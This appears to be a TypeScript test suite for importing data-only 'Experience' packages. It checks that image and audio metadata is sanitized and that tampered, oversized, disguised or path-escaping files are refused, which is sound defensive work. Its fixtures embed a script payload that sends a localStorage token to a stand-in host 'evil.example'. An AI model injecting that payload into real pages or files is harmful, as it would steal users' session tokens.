// Experience files (Capability API 1.373): a data-only Experience as one plain JSON file, read as a stream,
// reviewed from its start alone, and imported only when every file matches its manifest.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, readdirSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const dataDir = mkdtempSync(join(tmpdir(), "marinara-experience-file-"));
process.env.DATA_DIR = dataDir;
const packagesRoot = join(dataDir, "capability-packages");

const {
  EXPERIENCE_FILE_HEADER_MAX_BYTES,
  ExperienceFileError,
  ExperienceFileReader,
  experienceFileParts,
  experienceFileType,
  readExperienceFileManifest,
} = await import("../../packages/shared/src/features/world/experience-file.js");
const { capabilityPackageManifestSchema } =
  await import("../../packages/shared/src/schemas/capability-package.schema.js");
const { capabilityPackageManager } =
  await import("../../packages/server/src/services/capability-packages/package-manager.service.js");

const encoder = new TextEncoder();
const sha256 = (data: Uint8Array) => createHash("sha256").update(data).digest("hex");

function experience(
  files: Array<{ path: string; data: Uint8Array }>,
  overrides: Record<string, unknown> = {},
): Record<string, unknown> {
  return {
    schemaVersion: 2,
    id: "held-autumn-test",
    name: "Held Autumn (test)",
    version: "1.0.0",
    description: "An Experience file fixture.",
    capabilityApi: { major: 1, minor: 373 },
    builtAgainst: { engineVersion: "2.4.6", engineCommit: "0".repeat(40) },
    engine: { min: "2.3.0", maxExclusive: "4.0.0" },
    kind: ["experience"],
    entrypoints: {},
    contributions: {
      slots: ["game-surface"],
      gameSurface: { setup: {} },
      assets: { paths: files.map((file) => file.path) },
    },
    files: files.map((file) => ({ path: file.path, sha256: sha256(file.data), bytes: file.data.byteLength })),
    permissions: [],
    ...overrides,
  };
}

// ── Real pictures and sounds, each carrying the kind of hidden text an import must not keep ──
const { getSharp } = await import("../../packages/server/src/services/image/sharp-runtime.js");
const sharp = await getSharp();
const pixels = { create: { width: 64, height: 48, channels: 3 as const, background: { r: 200, g: 120, b: 40 } } };
const HIDDEN = "<script>fetch('https://evil.example/?k='+localStorage.token)</script>";

const crcTable = Array.from({ length: 256 }, (_, index) => {
  let value = index;
  for (let bit = 0; bit < 8; bit += 1) value = value & 1 ? 0xedb88320 ^ (value >>> 1) : value >>> 1;
  return value >>> 0;
});
const crc32 = (bytes: Uint8Array) => {
  let crc = 0xffffffff;
  for (const byte of bytes) crc = crcTable[(crc ^ byte) & 0xff]! ^ (crc >>> 8);
  return (crc ^ 0xffffffff) >>> 0;
};
function pngChunk(type: string, body: Buffer) {
  const head = Buffer.alloc(8);
  head.writeUInt32BE(body.length, 0);
  head.write(type, 4, "latin1");
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(Buffer.concat([head.subarray(4), body])), 0);
  return Buffer.concat([head, body, crc]);
}
const cleanPng = await sharp(pixels).png().toBuffer();
// A tEXt and an iTXt chunk after IHDR, and an HTML page glued on after IEND.
const taggedPng = Buffer.concat([
  cleanPng.subarray(0, 33),
  pngChunk("tEXt", Buffer.from(`Comment\0${HIDDEN}`, "latin1")),
  pngChunk("iTXt", Buffer.from(`XML:com.adobe.xmp\0\0\0\0\0${HIDDEN}`, "latin1")),
  cleanPng.subarray(33),
  Buffer.from(`<html>${HIDDEN}</html>`),
]);

const oggCrcTable = Array.from({ length: 256 }, (_, index) => {
  let value = index << 24;
  for (let bit = 0; bit < 8; bit += 1) value = value & 0x80000000 ? (value << 1) ^ 0x04c11db7 : value << 1;
  return value >>> 0;
});
function oggPage(serial: number, sequence: number, flags: number, segments: number[], body: Buffer) {
  const page = Buffer.concat([Buffer.alloc(27), Buffer.from(segments), body]);
  page.write("OggS", 0, "latin1");
  page[5] = flags;
  page.writeUInt32LE(serial, 14);
  page.writeUInt32LE(sequence, 18);
  page[26] = segments.length;
  let crc = 0;
  for (const byte of page) crc = ((crc << 8) ^ oggCrcTable[((crc >>> 24) ^ byte) & 0xff]!) >>> 0;
  page.writeUInt32LE(crc, 22);
  return page;
}
/** An Ogg stream of these packets, laced over pages of at most 16 segments so packets cross pages. */
function ogg(packets: Buffer[], serial = 0x1234) {
  const lacing: Array<{ size: number; data: Buffer }> = [];
  for (const packet of packets) {
    let at = 0;
    for (;;) {
      const size = Math.min(255, packet.length - at);
      lacing.push({ size, data: packet.subarray(at, at + size) });
      at += size;
      if (size < 255) break;
    }
  }
  const pages: Buffer[] = [];
  for (let at = 0, sequence = 0; at < lacing.length; at += 16, sequence += 1) {
    const slice = lacing.slice(at, at + 16);
    const continued = at > 0 && lacing[at - 1]!.size === 255 ? 0x01 : 0;
    const flags = (sequence === 0 ? 0x02 : 0) | continued | (at + 16 >= lacing.length ? 0x04 : 0);
    pages.push(
      oggPage(
        serial,
        sequence,
        flags,
        slice.map((item) => item.size),
        Buffer.concat(slice.map((item) => item.data)),
      ),
    );
  }
  return Buffer.concat(pages);
}
function vorbisComments(vendor: string, comments: string[]) {
  const parts = [Buffer.from("\x03vorbis", "latin1")];
  const field = (text: string) => {
    const bytes = Buffer.from(text);
    const length = Buffer.alloc(4);
    length.writeUInt32LE(bytes.length);
    parts.push(length, bytes);
  };
  field(vendor);
  const count = Buffer.alloc(4);
  count.writeUInt32LE(comments.length);
  parts.push(count);
  for (const comment of comments) field(comment);
  parts.push(Buffer.from([1]));
  return Buffer.concat(parts);
}
const vorbisId = Buffer.concat([Buffer.from("\x01vorbis", "latin1"), Buffer.alloc(23, 1)]);
const vorbisSetup = Buffer.concat([
  Buffer.from("\x05vorbis", "latin1"),
  Buffer.from(Uint8Array.from({ length: 200_001 }, (_, index) => (index * 17) % 251)),
]);
const taggedOgg = ogg([
  vorbisId,
  vorbisComments(`Lavf ${HIDDEN}`, [`TITLE=${HIDDEN}`, `METADATA_BLOCK_PICTURE=${"A".repeat(900)}`]),
  vorbisSetup,
]);

const picture = new Uint8Array(taggedPng);
const music = new Uint8Array(taggedOgg);
const data = encoder.encode(JSON.stringify({ hello: "world" }));
const files = [
  { path: "art/portrait.png", data: picture },
  { path: "music/theme.ogg", data: music },
  { path: "worlds/vale.json", data },
];

/** The file as bytes, handed over in uneven chunks the way a network delivers it. */
async function* stream(text: string, size = 1_337): AsyncGenerator<Uint8Array> {
  const bytes = encoder.encode(text);
  for (let at = 0; at < bytes.length; at += size) yield bytes.subarray(at, at + size);
}

const fileText = (manifest: unknown, parts = files) => experienceFileParts(manifest, parts).join("");

// ── The schema: a data-only Experience carries nothing that runs ──
{
  const parsed = capabilityPackageManifestSchema.safeParse(experience(files));
  assert.ok(parsed.success, "A data-only Experience needs no client entrypoint for its game surface");
  const refuse = (overrides: Record<string, unknown>, pattern: RegExp) => {
    const result = capabilityPackageManifestSchema.safeParse(experience(files, overrides));
    assert.equal(result.success, false);
    assert.match(result.error!.issues.map((issue) => issue.message).join("\n"), pattern);
  };
  refuse({ entrypoints: { client: "client.js" } }, /carries no code/);
  refuse({ permissions: ["ui"] }, /no permissions/);
  refuse({ kind: ["experience", "agent"] }, /nothing else/);
  refuse({ capabilityApi: { major: 1, minor: 372 } }, /1\.373 or newer/);
  refuse(
    { files: [{ path: "client.js", sha256: "0".repeat(64), bytes: 1 }] },
    /client\.js is not a picture, music or data file/,
  );
  refuse({ contributions: { slots: ["game-surface", "home-widget"] } }, /"game-surface" slot and nothing else/);
  // A file name the file would have to escape cannot be carried in one.
  for (const path of ['art/a"b.png', "art/a\\b.png", "art/a\u0001b.png", "art/a\ud800b.png"]) {
    refuse({ files: [{ path, sha256: "0".repeat(64), bytes: 1 }] }, /a character a file name cannot carry/);
  }
  // Any other game surface still needs a client to draw it.
  const drawn = capabilityPackageManifestSchema.safeParse(experience(files, { kind: ["agent"] }));
  assert.equal(drawn.success, false);
  assert.match(drawn.error!.issues.map((issue) => issue.message).join("\n"), /must provide a client entrypoint/);
  assert.equal(experienceFileType("a/b.PNG"), "image");
  assert.equal(experienceFileType("a/b.js"), null);
  assert.equal(experienceFileType("a/b.svg"), null);
}

// ── The review: the manifest from the start of the file alone, with its size by type ──
{
  const text = fileText(experience(files));
  const reader = new ExperienceFileReader();
  const head = encoder.encode(text).subarray(0, text.indexOf('\n"files"') + 1);
  const manifestEvent = reader.push(head).find((event) => event.type === "manifest");
  assert.ok(manifestEvent && manifestEvent.type === "manifest", "The manifest reads before any file does");
  const read = readExperienceFileManifest(manifestEvent.manifest);
  assert.ok(read.ok);
  assert.equal(read.summary.contentBytes, picture.length + music.length + data.length);
  assert.deepEqual(read.summary.byType.image, { files: 1, bytes: picture.length });
  assert.deepEqual(read.summary.byType.audio, { files: 1, bytes: music.length });
  assert.deepEqual(read.summary.byType.data, { files: 1, bytes: data.length });
  const agent = readExperienceFileManifest({ ...experience(files), kind: ["agent"], entrypoints: { client: "c.js" } });
  assert.equal(agent.ok, false, "Only an Experience package can come as an Experience file");
  // Whitespace cannot stand in for a manifest forever.
  assert.throws(
    () =>
      new ExperienceFileReader().push(
        encoder.encode(
          `{"format":"marinara-experience","version":1,"manifest":${" ".repeat(EXPERIENCE_FILE_HEADER_MAX_BYTES)}`,
        ),
      ),
    ExperienceFileError,
  );
}

// ── The reader, byte by byte: what it refuses ──
for (const [text, pattern] of [
  ['{"format":"marinara-experience","version":2,"manifest":{},"files":{}}', /version 2/],
  ['{"format":"marinara-experience","version":01,"manifest":{},"files":{}}', /version 01/],
  ["PK\u0003\u0004", /not an Experience file/],
  ['{"format":"marinara-experience","version":1,"manifest":{},"files":{"a":"QUJD","a":"QUJD"}}', /twice/],
  ['{"format":"marinara-experience","version":1,"manifest":{},"files":{"a":"QU\nJD"}}', /not base64/],
  ['{"format":"marinara-experience","version":1,"manifest":{},"files":{"a\\u0062":"QUJD"}}', /does not read/],
  ['{"format":"marinara-experience","version":1,"manifest":{},"files":{"a":"QUJD",}}', /do not read/],
  ['{"format":"marinara-experience","version":1,"manifest":{},"files":{"a":"QUJD"}}{}', /past its end/],
  ['{"format":"marinara-experience","version":1,"manifest":{},"files":{"a":"QQ==QUJD"}}', /not base64/],
] as const) {
  assert.throws(
    () => {
      const reader = new ExperienceFileReader();
      reader.push(encoder.encode(text));
      reader.finish();
    },
    pattern,
    text,
  );
}
assert.throws(() => {
  const reader = new ExperienceFileReader();
  reader.push(encoder.encode('{"format":"marinara-experience","version":1,"manifest":{},"files":{"a":"QUJD"'));
  reader.finish();
}, /stops before its end/);

// A path is as long in the file as the manifest lets it be: 240 characters, however many bytes each takes.
{
  const longest = `${"秋".repeat(235)}.json`;
  assert.ok(capabilityPackageManifestSchema.safeParse(experience([{ path: longest, data }])).success);
  const reader = new ExperienceFileReader();
  const events = [
    ...reader.push(encoder.encode(fileText(experience([{ path: longest, data }]), [{ path: longest, data }]))),
    ...reader.finish(),
  ];
  assert.ok(events.some((event) => event.type === "file-end" && event.path === longest));
  assert.throws(() => {
    const tooLong = new ExperienceFileReader();
    tooLong.push(
      encoder.encode(
        `{"format":"marinara-experience","version":1,"manifest":{},"files":{"${"秋".repeat(241)}":"QUJD"}}`,
      ),
    );
  }, /too long/);
}

// ── The sanitizer, format by format: the hidden text goes, the picture or sound stays ──
{
  const { sanitizeExperienceAsset } =
    await import("../../packages/server/src/services/capability-packages/experience-asset-sanitizer.js");
  const clean = (path: string, bytes: Buffer) => {
    const out = sanitizeExperienceAsset(path, bytes);
    for (const marker of ["<script>", "evil.example", "Exif", "http://ns.adobe.com/xap"]) {
      assert.equal(out.includes(marker), false, `${path} keeps no ${marker}`);
    }
    return out;
  };
  const exif = { IFD0: { ImageDescription: HIDDEN, Copyright: HIDDEN } };

  const jpeg = await sharp(pixels).jpeg().withExif(exif).toBuffer();
  assert.ok(jpeg.includes("evil.example"));
  const comment = Buffer.from(`\xff\xfe\x00\x50${HIDDEN}`.padEnd(82, " "), "latin1");
  const taggedJpeg = Buffer.concat([jpeg.subarray(0, 2), comment, jpeg.subarray(2), Buffer.from(HIDDEN)]);
  const strippedJpeg = clean("a/photo.jpeg", taggedJpeg);
  const jpegInfo = await sharp(strippedJpeg).metadata();
  assert.equal(jpegInfo.width, 64);
  assert.equal(jpegInfo.exif, undefined);
  await sharp(strippedJpeg).raw().toBuffer();

  const webp = await sharp(pixels).webp().withExif(exif).toBuffer();
  assert.ok(webp.includes("evil.example"));
  const strippedWebp = clean("a/b.webp", webp);
  assert.equal(strippedWebp.readUInt32LE(4), strippedWebp.length - 8, "The RIFF size is rewritten");
  assert.equal((await sharp(strippedWebp).metadata()).exif, undefined);
  await sharp(strippedWebp).raw().toBuffer();

  const gif = await sharp(pixels).gif().toBuffer();
  const gifComment = Buffer.concat([Buffer.from([0x21, 0xfe, HIDDEN.length]), Buffer.from(HIDDEN), Buffer.from([0])]);
  const gifStart = 13 + (gif[10]! & 0x80 ? 3 * (1 << ((gif[10]! & 7) + 1)) : 0);
  const strippedGif = clean(
    "a/b.gif",
    Buffer.concat([gif.subarray(0, gifStart), gifComment, gif.subarray(gifStart), Buffer.from(HIDDEN)]),
  );
  assert.equal((await sharp(strippedGif).metadata()).width, 64);

  const wavData = Buffer.alloc(400, 0x80);
  const riffChunk = (type: string, body: Buffer) => {
    const head = Buffer.alloc(8);
    head.write(type, 0, "latin1");
    head.writeUInt32LE(body.length, 4);
    return Buffer.concat([head, body, body.length % 2 ? Buffer.alloc(1) : Buffer.alloc(0)]);
  };
  const fmt = Buffer.alloc(16);
  fmt.writeUInt16LE(1, 0);
  fmt.writeUInt16LE(1, 2);
  fmt.writeUInt32LE(8000, 4);
  fmt.writeUInt32LE(8000, 8);
  fmt.writeUInt16LE(1, 12);
  fmt.writeUInt16LE(8, 14);
  const wavBody = Buffer.concat([
    Buffer.from("WAVE"),
    riffChunk("fmt ", fmt),
    riffChunk("LIST", Buffer.from(`INFOINAM${HIDDEN}`)),
    riffChunk("data", wavData),
  ]);
  const wavHead = Buffer.from("RIFF\0\0\0\0", "latin1");
  wavHead.writeUInt32LE(wavBody.length, 4);
  const strippedWav = clean("a/b.wav", Buffer.concat([wavHead, wavBody, Buffer.from(HIDDEN)]));
  assert.ok(strippedWav.includes(wavData));
  assert.equal(strippedWav.includes("LIST"), false);

  const frame = Buffer.concat([Buffer.from([0xff, 0xfb, 0x90, 0x64]), Buffer.alloc(413, 0x55)]);
  const id3Body = Buffer.from(`TIT2${HIDDEN}`);
  const id3 = Buffer.concat([Buffer.from([0x49, 0x44, 0x33, 4, 0, 0, 0, 0, 0, id3Body.length]), id3Body]);
  const id3v1 = Buffer.concat([Buffer.from("TAG"), Buffer.from(HIDDEN.padEnd(125, " ").slice(0, 125))]);
  const strippedMp3 = clean("a/b.mp3", Buffer.concat([id3, frame, frame, id3v1]));
  assert.deepEqual(strippedMp3, Buffer.concat([frame, frame]));

  const opus = ogg([
    Buffer.concat([Buffer.from("OpusHead"), Buffer.alloc(11, 1)]),
    Buffer.concat([
      Buffer.from("OpusTags"),
      Buffer.from([4, 0, 0, 0]),
      Buffer.from("evil"),
      Buffer.from([1, 0, 0, 0]),
      Buffer.from([HIDDEN.length + 6, 0, 0, 0]),
      Buffer.from(`TITLE=${HIDDEN}`),
      Buffer.from(HIDDEN),
    ]),
    Buffer.alloc(300, 9),
  ]);
  const strippedOpus = clean("a/b.ogg", opus);
  assert.equal(strippedOpus.length, opus.length);

  // What it refuses: a file that is not what its name says, or that is broken.
  const refused: Array<[string, Buffer, RegExp]> = [
    ["a/page.png", Buffer.from(`<html>${HIDDEN}</html>`), /a\/page\.png is not a PNG picture/],
    ["a/vector.png", Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg">${HIDDEN}</svg>`), /not a PNG picture/],
    ["a/really-jpeg.png", jpeg, /not a PNG picture/],
    ["a/really-png.gif", cleanPng, /not a GIF picture/],
    ["a/cut.png", cleanPng.subarray(0, 40), /not a well-formed PNG picture/],
    ["a/page.ogg", Buffer.from(HIDDEN), /not a well-formed OGG sound/],
    ["a/page.mp3", Buffer.from(HIDDEN), /not a well-formed MP3 sound/],
    ["a/page.wav", Buffer.from(HIDDEN), /not a well-formed WAV sound/],
    ["a/broken.json", Buffer.from("{nope"), /not valid JSON/],
    ["a/latin1.json", Buffer.from([0x22, 0xe9, 0x22]), /not valid JSON/],
    ["a/run.js", Buffer.from("1"), /not a picture, music or data file/],
  ];
  const badCrc = Buffer.from(taggedOgg);
  badCrc[40] = badCrc[40]! ^ 1;
  refused.push(["a/bad-crc.ogg", badCrc, /checksum is wrong/]);
  const theora = ogg([Buffer.concat([Buffer.from("\x80theora"), Buffer.alloc(40)]), Buffer.alloc(10)]);
  refused.push(["a/video.ogg", theora, /not Vorbis or Opus/]);
  for (const [path, bytes, pattern] of refused) {
    assert.throws(
      () => sanitizeExperienceAsset(path, bytes),
      (error: unknown) => {
        // The server takes ExperienceFileError from the built shared package, so match it by name.
        assert.equal((error as Error).constructor.name, ExperienceFileError.name, path);
        assert.match((error as Error).message, pattern, path);
        return true;
      },
    );
  }
}

// ── The import: installed as it streams, every file checked ──
const leftovers = () =>
  existsSync(packagesRoot) ? readdirSync(packagesRoot).filter((name) => name.startsWith(".import-")) : [];
{
  const installed = await capabilityPackageManager.installExperienceFile(stream(fileText(experience(files))));
  assert.equal(installed.id, "held-autumn-test");
  assert.equal(installed.status, "active");
  assert.equal(installed.readiness, "ready");
  const root = join(packagesRoot, "versions", "held-autumn-test", "1.0.0");
  // What is stored is the picture and the sound without their hidden text, and the installed manifest
  // records those bytes.
  const storedPicture = readFileSync(join(root, "art/portrait.png"));
  const storedMusic = readFileSync(join(root, "music/theme.ogg"));
  assert.deepEqual(storedPicture, cleanPng, "The PNG keeps only the chunks that draw it");
  assert.equal(storedMusic.length, taggedOgg.length, "The Ogg comments are blanked in place");
  for (const stored of [storedPicture, storedMusic]) {
    assert.equal(stored.includes("<script>"), false);
    assert.equal(stored.includes("evil.example"), false);
  }
  // Only the comment packet and the checksums of its pages changed; the sound's packets are as they were.
  const commentStart = taggedOgg.indexOf("\x03vorbis", 0, "latin1");
  const setupStart = taggedOgg.indexOf("\x05vorbis", 0, "latin1");
  assert.deepEqual(storedMusic.subarray(setupStart + 4096), taggedOgg.subarray(setupStart + 4096));
  assert.deepEqual(storedMusic.subarray(0, 22), taggedOgg.subarray(0, 22));
  assert.deepEqual(storedMusic.subarray(26, commentStart), taggedOgg.subarray(26, commentStart));
  await sharp(storedPicture).metadata();
  assert.deepEqual(new Uint8Array(readFileSync(join(root, "worlds/vale.json"))), data);
  const storedManifest = JSON.parse(readFileSync(join(root, "manifest.json"), "utf8"));
  assert.equal(storedManifest.id, "held-autumn-test");
  for (const declared of storedManifest.files) {
    const bytes = readFileSync(join(root, declared.path));
    assert.equal(declared.sha256, sha256(bytes), `${declared.path} is recorded as stored`);
    assert.equal(declared.bytes, bytes.length);
  }
  const listed = await capabilityPackageManager.installed();
  assert.ok(listed.some((item) => item.id === "held-autumn-test" && item.manifest.kind[0] === "experience"));
  // Its files are served as any package's are.
  const served = await capabilityPackageManager.packageAsset("held-autumn-test", "art/portrait.png");
  assert.deepEqual(Buffer.from(served!.data), cleanPng);
  assert.deepEqual(leftovers(), []);
}

const refuseImport = async (text: string, pattern: RegExp, message: string) => {
  await assert.rejects(capabilityPackageManager.installExperienceFile(stream(text)), pattern, message);
  assert.deepEqual(leftovers(), [], `${message}: nothing it wrote is left behind`);
};
{
  const tampered = experienceFileParts(experience(files, { version: "1.0.1" }), [
    files[0]!,
    { path: "music/theme.ogg", data: music.map((byte, index) => (index === 1000 ? byte ^ 1 : byte)) },
    files[2]!,
  ]).join("");
  await refuseImport(tampered, /does not match its manifest's checksum/, "A changed byte");
  await refuseImport(
    fileText(experience(files, { version: "1.0.1" }), [...files, { path: "extra.json", data }]),
    /which its manifest does not list/,
    "An undeclared file",
  );
  await refuseImport(
    fileText(experience(files, { version: "1.0.1" }), files.slice(0, 2)),
    /missing worlds\/vale\.json/,
    "A missing file",
  );
  await refuseImport(
    fileText(experience(files, { version: "1.0.1" }), [
      files[0]!,
      { path: "music/theme.ogg", data: music.subarray(0, 100) },
      files[2]!,
    ]),
    /not the size its manifest says/,
    "A short file",
  );
  await refuseImport(
    fileText(experience(files, { version: "1.0.1" }), [
      files[0]!,
      { path: "music/theme.ogg", data: new Uint8Array(music.length + 5) },
      files[2]!,
    ]),
    /larger than its manifest says/,
    "A long file",
  );
  await refuseImport(fileText(experience(files, { version: "0.9.0" })), /refusing to downgrade/, "An older version");
  const withPath = (path: string) => {
    const manifest = experience([{ path, data }]);
    return fileText({ ...manifest, version: "1.0.1" }, [{ path, data }]);
  };
  await refuseImport(withPath("../escape.json"), /unsafe path/, "A path out of the package");
  await refuseImport(withPath("run.js"), /run\.js is not a picture, music or data file/, "A script");
  await refuseImport(
    fileText({ ...experience(files), kind: ["agent"], entrypoints: { client: "client.js" } }),
    /holds an Experience package only/,
    "A package with code",
  );
  const disguised = [files[0]!, files[1]!, { path: "worlds/vale.json", data: encoder.encode("<html>") }];
  await refuseImport(
    fileText(experience(disguised, { version: "1.0.1" }), disguised),
    /worlds\/vale\.json is not valid JSON/,
    "A data file that is not JSON",
  );
  const truncated = fileText(experience(files, { version: "1.0.1" }));
  await refuseImport(truncated.slice(0, truncated.length - 1000), /stops before its end/, "A cut-off file");
  // Nothing refused changed what was installed.
  const listed = await capabilityPackageManager.installed();
  assert.equal(listed.find((item) => item.id === "held-autumn-test")?.version, "1.0.0");
}

// A newer version replaces the old, as a catalog update would.
{
  const installed = await capabilityPackageManager.installExperienceFile(
    stream(fileText(experience(files, { version: "1.1.0" })), 65_536),
  );
  assert.equal(installed.version, "1.1.0");
  assert.equal(installed.previousVersion, "1.0.0");
}

// ── The catalog: an Experience comes only as an Experience file, never a package zip ──
{
  const catalogEntry = (manifest: Record<string, unknown>, url: string) => ({
    manifest: capabilityPackageManifestSchema.parse(manifest),
    artifact: { url, sha256: "0".repeat(64), bytes: 1 },
  });
  const zipped = experience(files, { id: "zipped-experience", name: "Zipped Experience" });
  const drawn = {
    ...experience(files, { id: "drawn-surface", name: "Drawn Surface", kind: ["agent"] }),
    capabilityApi: { major: 1, minor: 372 },
    entrypoints: { client: "client.js" },
    files: [{ path: "client.js", sha256: "0".repeat(64), bytes: 1 }],
    contributions: { slots: ["game-surface"], gameSurface: { surfaceClass: "full" } },
  };
  const original = capabilityPackageManager.catalog;
  const entries = [
    catalogEntry(zipped, "https://raw.githubusercontent.com/Pasta-Devs/Marinara-Agents/main/artifacts/zipped.zip"),
  ];
  const drawnParsed = capabilityPackageManifestSchema.safeParse(drawn);
  if (drawnParsed.success) {
    entries.push(
      catalogEntry(drawn, "https://raw.githubusercontent.com/Pasta-Devs/Marinara-Agents/main/artifacts/drawn.zip"),
    );
  }
  capabilityPackageManager.catalog = (async () => ({ schemaVersion: 1, packages: entries })) as typeof original;
  try {
    for (const entry of entries) {
      await assert.rejects(
        capabilityPackageManager.install(entry.manifest.id, entry.manifest.version, entry.artifact.sha256),
        /is an Experience packaged as a zip\. Experiences install only from an \.experience\.json file/,
        `${entry.manifest.id}: refused before anything is downloaded`,
      );
    }
    assert.equal(entries.length, 2, `The drawn surface fixture parses: ${JSON.stringify(drawnParsed.error?.issues)}`);
  } finally {
    capabilityPackageManager.catalog = original;
  }

  // A catalog's Experience file must carry the very manifest the catalog lists.
  const listed = experience(files, { id: "catalog-experience", version: "2.0.0" });
  const shown = capabilityPackageManifestSchema.parse({ ...listed, description: "Not what the file says." });
  await assert.rejects(
    capabilityPackageManager.installExperienceFile(stream(fileText(listed)), { expectedManifest: shown }),
    /does not match the catalog/,
  );
  const matching = await capabilityPackageManager.installExperienceFile(stream(fileText(listed)), {
    expectedManifest: capabilityPackageManifestSchema.parse(listed),
  });
  assert.equal(matching.id, "catalog-experience");
}

console.log("experience-file-import: ok");
